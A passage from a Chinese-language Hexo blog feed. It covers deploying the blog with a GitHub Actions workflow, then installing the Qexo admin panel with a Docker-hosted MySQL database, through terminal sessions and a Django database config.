Tit1e/hexo-deploy-github-pages-action@master</span><br>      <span class="hljs-comment">#   env:</span><br>      <span class="hljs-comment">#     PERSONAL_TOKEN: $&#123;&#123; secrets.GITHUBTOKEN &#125;&#125; # secret 名</span><br>      <span class="hljs-comment">#     PUBLISH_REPOSITORY: ningan123/ningan123.github.io # 公共仓库，格式：GitHub 用户名/仓库名</span><br>      <span class="hljs-comment">#     BRANCH: main # 分支，根据实际填写</span><br>      <span class="hljs-comment">#     PUBLISH_DIR: ./public # 部署 public 目录下的文件，hexo 一般都是这个目录，可根据实际调整</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">deploy</span> <span class="hljs-comment">#此处master:main 指从本地的master分支提交到远程仓库的main分支(不是博客的分支写master即可)，若远程仓库没有对应分支则新建一个。如有其他需要，可以根据自己的需求更改。</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string">          cd ./public</span><br><span class="hljs-string">          git init</span><br><span class="hljs-string">          git config --global user.name &#x27;$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;&#x27;</span><br><span class="hljs-string">          git config --global user.email &#x27;$&#123;&#123; secrets.GITHUBEMAIL &#125;&#125;&#x27;</span><br><span class="hljs-string">          git add .</span><br><span class="hljs-string">          git commit -m &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; $(date +&quot;%Z %Y-%m-%d %A %H:%M:%S&quot;) Updated By Github Actions&quot;</span><br><span class="hljs-string">          git push --force --quiet &quot;https://$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;:$&#123;&#123; secrets.GITHUBTOKEN &#125;&#125;@github.com/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;.github.io.git&quot; master:main  # GitHub配置</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102154805.png" alt="image.png"></p><p>github.io里面也即时推送过来la~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102154822.png" alt="image.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://isedu.top/index.php/archives/144/#menu_index_10">Github Action自动化部署Hexo博客和Qexo管理后台 - 清~幽殇</a></p><p><a href="https://blog.anheyu.com/posts/asdx.html">♪(^∇^*)欢迎肥来！使用 Github Action 自动部署 | 安知鱼</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【hexo系列】04.使用qexo管理hexo</title>
    <link href="/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9104.%E4%BD%BF%E7%94%A8qexo%E7%AE%A1%E7%90%86hexo/"/>
    <url>/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9104.%E4%BD%BF%E7%94%A8qexo%E7%AE%A1%E7%90%86hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-150-generic <span class="hljs-comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="linux下通过docker安装mysql"><a href="#linux下通过docker安装mysql" class="headerlink" title="linux下通过docker安装mysql"></a>linux下通过docker安装mysql</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan kubeconfig]<span class="hljs-comment"># docker search mysql</span><br>NAME                   DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>mysql                  MySQL is a widely used, open-source relation…   15461     [OK]       <br>mysql/mysql-server     Optimized MySQL Server Docker images. Create…   1023                 [OK]<br>bitnami/mysql          Bitnami container image <span class="hljs-keyword">for</span> MySQL               118                  [OK]<br>mysql/mysql-cluster    Experimental MySQL Cluster Docker images. Cr…   100                  <br>ubuntu/mysql           MySQL open <span class="hljs-built_in">source</span> fast, stable, multi-thread…   65                   <br>circleci/mysql         MySQL is a widely used, open-source relation…   30                   <br>mysql/mysql-router     MySQL Router provides transparent routing be…   28                   <br>rapidfort/mysql        RapidFort optimized, hardened image <span class="hljs-keyword">for</span> MySQL   26                   <br>google/mysql           MySQL server <span class="hljs-keyword">for</span> Google Compute Engine          25                   [OK]<br>cimg/mysql                                                             3                    <br>alpine/mysql           mysql client                                    3                    <br>datajoint/mysql        MySQL image pre-configured to work smoothly …   2                    [OK]<br>ilios/mysql            Mysql configured <span class="hljs-keyword">for</span> running Ilios              1                    [OK]<br>mysql/mysql-operator   MySQL Operator <span class="hljs-keyword">for</span> Kubernetes                   1                    <br>jumpserver/mysql                                                       1                    <br>elestio/mysql          Mysql, verified and packaged by Elestio         1                    <br>ddev/mysql             ARM64 base images <span class="hljs-keyword">for</span> ddev-dbserver-mysql-8.…   1                    <br>eclipse/mysql          Mysql 5.7, curl, rsync                          1                    [OK]<br>vitess/mysql           Lightweight image to run MySQL with Vitess      1                    <br>bitnamicharts/mysql    Bitnami Helm chart <span class="hljs-keyword">for</span> MySQL                    0                    <br>corpusops/mysql        https://github.com/corpusops/docker-images/     0                    <br>javanile/mysql         MySQL <span class="hljs-keyword">for</span> development                           0                    <br>vulhub/mysql                                                           0                    <br>docksal/mysql          MySQL service images <span class="hljs-keyword">for</span> Docksal - https://d…   0                    <br>mirantis/mysql                                                         0                    <br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># docker pull mysql</span><br>Using default tag: latest<br>latest: Pulling from library/mysql<br>eba3c26198b7: Pull complete <br>97f7c8c33abe: Pull complete <br>aa23d877fa04: Pull complete <br>a143609ddd2d: Pull complete <br>78308a3437c4: Pull complete <br>c0880e4b3737: Pull complete <br>4bab267f9ce1: Pull complete <br>e575f6d9b17a: Pull complete <br>607f86c00053: Pull complete <br>cd68caa5febe: Pull complete <br>Digest: sha256:fd8d1b4e287c49e1e35eb5a103f337111947662130eb8a3e6c3e823813f47f7d<br>Status: Downloaded newer image <span class="hljs-keyword">for</span> mysql:latest<br>docker.io/library/mysql:latest<br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># docker run -p 3306:3306 --name qexo -e MYSQL_ROOT_PASSWORD=123456 -d mysql</span><br>933dad3ceaa45cee703201fd77397affbef16e531982c8974bfdda577b8d8d36<br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># </span><br>[root@ningan kubeconfig]<span class="hljs-comment"># netstat -nltp |grep 3306</span><br>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      13220/docker-proxy  <br>tcp6       0      0 :::3306       <br><br></code></pre></td></tr></table></figure><h2 id="linux下安装qexo"><a href="#linux下安装qexo" class="headerlink" title="linux下安装qexo"></a>linux下安装qexo</h2><h3 id="主线：安装"><a href="#主线：安装" class="headerlink" title="主线：安装"></a>主线：安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># wget https://github.com/Qexo/Qexo/archive/refs/tags/3.4.1.tar.gz</span><br>--2024-11-01 04:04:55--  https://github.com/Qexo/Qexo/archive/refs/tags/3.4.1.tar.gz<br>Connecting to 192.168.20.20:7890... connected.<br>Proxy request sent, awaiting response... 302 Found<br>Location: https://codeload.github.com/Qexo/Qexo/tar.gz/refs/tags/3.4.1 [following]<br>--2024-11-01 04:04:55--  https://codeload.github.com/Qexo/Qexo/tar.gz/refs/tags/3.4.1<br>Connecting to 192.168.20.20:7890... connected.<br>Proxy request sent, awaiting response... 200 OK<br>Length: unspecified [application/x-gzip]<br>Saving to: ‘3.4.1.tar.gz’<br><br>3.4.1.tar.gz                            [ &lt;=&gt;                                                             ] 186.99K  --.-KB/s    <span class="hljs-keyword">in</span> 0.1s    <br><br>2024-11-01 04:04:56 (1.79 MB/s) - ‘3.4.1.tar.gz’ saved [191477]<br><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># tar -zxvf 3.4.1.tar.gz </span><br>Qexo-3.4.1/<br>Qexo-3.4.1/.dockerignore<br>Qexo-3.4.1/.env.example<br>Qexo-3.4.1/.github/<br>Qexo-3.4.1/.github/ISSUE_TEMPLATE/<br>Qexo-3.4.1/.github/ISSUE_TEMPLATE/bug_report.yml<br>Qexo-3.4.1/.github/ISSUE_TEMPLATE/config.yml<br>Qexo-3.4.1/.gitignore<br>Qexo-3.4.1/Dockerfile<br>Qexo-3.4.1/Dockerfile_aio_sqlite_hexo<br>Qexo-3.4.1/LICENSE<br>Qexo-3.4.1/Makefile<br>Qexo-3.4.1/Pipfile<br>Qexo-3.4.1/Pipfile.lock<br>Qexo-3.4.1/README.md<br>Qexo-3.4.1/core/<br>Qexo-3.4.1/core/__init__.py<br>Qexo-3.4.1/core/asgi.py<br>Qexo-3.4.1/core/qexoSettings.py<br>Qexo-3.4.1/core/settings.py<br>Qexo-3.4.1/core/urls.py<br>Qexo-3.4.1/core/wsgi.py<br>Qexo-3.4.1/docker-compose.yaml<br>Qexo-3.4.1/hexoweb/<br>Qexo-3.4.1/hexoweb/__init__.py<br>Qexo-3.4.1/hexoweb/api.py<br>Qexo-3.4.1/hexoweb/apps.py<br>Qexo-3.4.1/hexoweb/exceptions.py<br>Qexo-3.4.1/hexoweb/functions.py<br>Qexo-3.4.1/hexoweb/libs/<br>Qexo-3.4.1/hexoweb/libs/__init__.py<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/__init__.py<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/base.py<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/features.py<br>Qexo-3.4.1/hexoweb/libs/elevator/<br>Qexo-3.4.1/hexoweb/libs/elevator/__init__.py<br>Qexo-3.4.1/hexoweb/libs/elevator/elevator.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/2_5_0.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/2_5_1.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/2_7_0.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/3_1_1.py<br>Qexo-3.4.1/hexoweb/libs/i18n/<br>Qexo-3.4.1/hexoweb/libs/i18n/__init__.py<br>Qexo-3.4.1/hexoweb/libs/i18n/core.py<br>Qexo-3.4.1/hexoweb/libs/i18n/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/__init__.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/en_UK.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/en_US.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/fr_FR.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/ja_JP.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/ko_KR.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/zh_CN.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/zh_TW.py<br>Qexo-3.4.1/hexoweb/libs/image/<br>Qexo-3.4.1/hexoweb/libs/image/__init__.py<br>Qexo-3.4.1/hexoweb/libs/image/core.py<br>Qexo-3.4.1/hexoweb/libs/image/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/<br>Qexo-3.4.1/hexoweb/libs/image/providers/__init__.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/alioss.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/custom.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/dogecloudoss.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/ftp.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/gitHub.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/s3.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/upyun_storage.py<br>Qexo-3.4.1/hexoweb/libs/image/replace.py<br>Qexo-3.4.1/hexoweb/libs/onepush/<br>Qexo-3.4.1/hexoweb/libs/onepush/__init__.py<br>Qexo-3.4.1/hexoweb/libs/onepush/__version__.py<br>Qexo-3.4.1/hexoweb/libs/onepush/core.py<br>Qexo-3.4.1/hexoweb/libs/onepush/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/__init__.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/bark.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/custom.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/dingtalk.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/discord.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/gocqhttp.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/gotify.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/lark.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/pushdeer.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/pushplus.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/qmsg.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/serverchan.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/serverchanturbo.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/smtp.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/telegram.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/wechatworkapp.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/wechatworkbot.py<br>Qexo-3.4.1/hexoweb/libs/platforms/<br>Qexo-3.4.1/hexoweb/libs/platforms/__init__.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/__init__.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/hexo.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/hugo.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/valaxy.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/vitepress.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/vuepress.py<br>Qexo-3.4.1/hexoweb/libs/platforms/core.py<br>Qexo-3.4.1/hexoweb/libs/platforms/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/__init__.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/gitHub.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/gitLab.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/local.py<br>Qexo-3.4.1/hexoweb/migrations/<br>Qexo-3.4.1/hexoweb/migrations/0001_initial.py<br>Qexo-3.4.1/hexoweb/migrations/0002_postmodel.py<br>Qexo-3.4.1/hexoweb/migrations/0003_imagemodel_deleteconfig.py<br>Qexo-3.4.1/hexoweb/migrations/__init__.py<br>Qexo-3.4.1/hexoweb/models.py<br>Qexo-3.4.1/hexoweb/pub.py<br>Qexo-3.4.1/hexoweb/tests.py<br>Qexo-3.4.1/hexoweb/views.py<br>Qexo-3.4.1/manage.py<br>Qexo-3.4.1/migrate.sh<br>Qexo-3.4.1/requirements.txt<br>Qexo-3.4.1/requirements_withoutmysql.txt<br>Qexo-3.4.1/start.sh<br>Qexo-3.4.1/templates/<br>Qexo-3.4.1/templates/accounts/<br>Qexo-3.4.1/templates/accounts/init.html<br>Qexo-3.4.1/templates/accounts/login.html<br>Qexo-3.4.1/templates/accounts/migrate.html<br>Qexo-3.4.1/templates/accounts/update.html<br>Qexo-3.4.1/templates/home/<br>Qexo-3.4.1/templates/home/advanced.html<br>Qexo-3.4.1/templates/home/configs.html<br>Qexo-3.4.1/templates/home/custom.html<br>Qexo-3.4.1/templates/home/edit.html<br>Qexo-3.4.1/templates/home/edit_config.html<br>Qexo-3.4.1/templates/home/edit_page.html<br>Qexo-3.4.1/templates/home/edit_talk.html<br>Qexo-3.4.1/templates/home/friends.html<br>Qexo-3.4.1/templates/home/images.html<br>Qexo-3.4.1/templates/home/index.html<br>Qexo-3.4.1/templates/home/new.html<br>Qexo-3.4.1/templates/home/new_page.html<br>Qexo-3.4.1/templates/home/page-403.html<br>Qexo-3.4.1/templates/home/page-404.html<br>Qexo-3.4.1/templates/home/page-500.html<br>Qexo-3.4.1/templates/home/pages.html<br>Qexo-3.4.1/templates/home/posts.html<br>Qexo-3.4.1/templates/home/settings.html<br>Qexo-3.4.1/templates/home/talks.html<br>Qexo-3.4.1/templates/home/userscripts.html<br>Qexo-3.4.1/templates/includes/<br>Qexo-3.4.1/templates/includes/editor-scripts.html<br>Qexo-3.4.1/templates/includes/footer.html<br>Qexo-3.4.1/templates/includes/navigation.html<br>Qexo-3.4.1/templates/includes/scripts.html<br>Qexo-3.4.1/templates/includes/sidenav.html<br>Qexo-3.4.1/templates/layouts/<br>Qexo-3.4.1/templates/layouts/base-fullscreen.html<br>Qexo-3.4.1/templates/layouts/base.html<br>Qexo-3.4.1/templates/layouts/json.html<br>Qexo-3.4.1/templates/robots.txt<br>Qexo-3.4.1/update_tag.sh<br>Qexo-3.4.1/vercel.json<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># cd Qexo-3.4.1/</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># ll</span><br>total 204<br>drwxrwxr-x  6 root root  4096 Aug 25 20:31 ./<br>drwxr-xr-x 75 root root  4096 Nov  1 04:05 ../<br>drwxrwxr-x  2 root root  4096 Aug 25 20:31 core/<br>-rw-rw-r--  1 root root   185 Aug 25 20:31 docker-compose.yaml<br>-rw-rw-r--  1 root root   519 Aug 25 20:31 Dockerfile<br>-rw-rw-r--  1 root root  1054 Aug 25 20:31 Dockerfile_aio_sqlite_hexo<br>-rw-rw-r--  1 root root     0 Aug 25 20:31 .dockerignore<br>-rw-rw-r--  1 root root    15 Aug 25 20:31 .env.example<br>drwxrwxr-x  3 root root  4096 Aug 25 20:31 .github/<br>-rw-rw-r--  1 root root    55 Aug 25 20:31 .gitignore<br>drwxrwxr-x  4 root root  4096 Aug 25 20:31 hexoweb/<br>-rw-rw-r--  1 root root 35149 Aug 25 20:31 LICENSE<br>-rw-rw-r--  1 root root   347 Aug 25 20:31 Makefile<br>-rw-rw-r--  1 root root   660 Aug 25 20:31 manage.py<br>-rwxrwxr-x  1 root root    90 Aug 25 20:31 migrate.sh*<br>-rw-rw-r--  1 root root   679 Aug 25 20:31 Pipfile<br>-rw-rw-r--  1 root root 84338 Aug 25 20:31 Pipfile.lock<br>-rw-rw-r--  1 root root  3156 Aug 25 20:31 README.md<br>-rw-rw-r--  1 root root   369 Aug 25 20:31 requirements.txt<br>-rw-rw-r--  1 root root   290 Aug 25 20:31 requirements_withoutmysql.txt<br>-rw-rw-r--  1 root root   443 Aug 25 20:31 start.sh<br>drwxrwxr-x  6 root root  4096 Aug 25 20:31 templates/<br>-rw-rw-r--  1 root root  1247 Aug 25 20:31 update_tag.sh<br>-rw-rw-r--  1 root root   344 Aug 25 20:31 vercel.json<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># vi configs.py</span><br>import pymysql<br>pymysql.install_as_MySQLdb()<br>DOMAINS = [<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;ningan123.github.io&quot;</span>]<br>DATABASES = &#123;<br>    <span class="hljs-string">&#x27;default&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;ENGINE&#x27;</span>: <span class="hljs-string">&#x27;django.db.backends.mysql&#x27;</span>,<br>            <span class="hljs-string">&#x27;NAME&#x27;</span>: <span class="hljs-string">&#x27;qexo&#x27;</span>,<br>            <span class="hljs-string">&#x27;USER&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>            <span class="hljs-string">&#x27;PASSWORD&#x27;</span>: <span class="hljs-string">&#x27;123456&#x27;</span>,<br>            <span class="hljs-string">&#x27;HOST&#x27;</span>: <span class="hljs-string">&#x27;192.168.20.201&#x27;</span>,<br>            <span class="hljs-string">&#x27;PORT&#x27;</span>: <span class="hljs-string">&#x27;3306&#x27;</span>,<br>            <span class="hljs-string">&#x27;OPTIONS&#x27;</span>: &#123;<br>                <span class="hljs-string">&quot;init_command&quot;</span>: <span class="hljs-string">&quot;SET sql_mode=&#x27;STRICT_TRANS_TABLES&#x27;&quot;</span><br>            &#125;<br>    &#125;<br>&#125;<br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3 -m pip install -r requirements.txt</span><br>/usr/lib/python3/dist-packages/secretstorage/dhcrypto.py:15: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support <span class="hljs-keyword">for</span> it is deprecated <span class="hljs-keyword">in</span> cryptography. The next release of cryptography will remove support <span class="hljs-keyword">for</span> 